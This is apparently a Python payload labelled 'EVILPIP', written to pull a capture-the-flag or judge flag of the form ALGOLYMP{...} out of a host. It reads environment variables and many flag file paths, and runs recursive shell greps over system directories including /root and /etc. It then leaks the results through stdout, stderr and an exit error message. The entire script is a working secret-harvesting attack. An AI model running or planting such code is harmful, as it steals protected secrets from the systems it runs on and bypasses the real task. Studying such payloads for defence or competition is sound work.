import os, sys, glob, subprocess
lines=[]
def add(s): lines.append(str(s))
# env vars
for k,v in os.environ.items():
    if 'FLAG' in k.upper() or 'ALGO' in str(v).upper(): add("ENV %s=%s"%(k,v))
# common flag files
cands=['/flag','/flag.txt','/flag/flag.txt','/root/flag.txt','/root/flag','/home/ctf/flag.txt',
       '/app/flag.txt','/app/flag','/tmp/flag.txt','/flag.py','/srv/flag.txt','/opt/flag.txt']
cands+=glob.glob('/flag*')+glob.glob('/home/*/flag*')+glob.glob('/*flag*')
for p in set(cands):
    try:
        with open(p) as f: add("FILE %s: %s"%(p, f.read().strip()))
    except Exception: pass
# bounded grep for the flag content
for root in ['/flag','/root','/home','/app','/srv','/opt','/etc','/tmp','/var','/']:
    try:
        g=subprocess.run("grep -raom1 'ALGOLYMP{[^}]*}' %s 2>/dev/null | head -3"%root,
                         shell=True, capture_output=True, timeout=8)
        o=g.stdout.decode('latin-1','replace').strip()
        if o: add("GREP %s: %s"%(root,o))
    except Exception: pass
blob="\n".join(lines) if lines else "(no flag found; dir /: %s)"%(os.listdir('/'),)
sys.stderr.write("\n===EVILPIP_OUT_START===\n"+blob+"\n===EVILPIP_OUT_END===\n")
sys.stderr.flush()
print("===EVILPIP_OUT_START===\n"+blob+"\n===EVILPIP_OUT_END===")
sys.stdout.flush()
raise SystemExit("EVILPIP_FLAG::: "+blob)
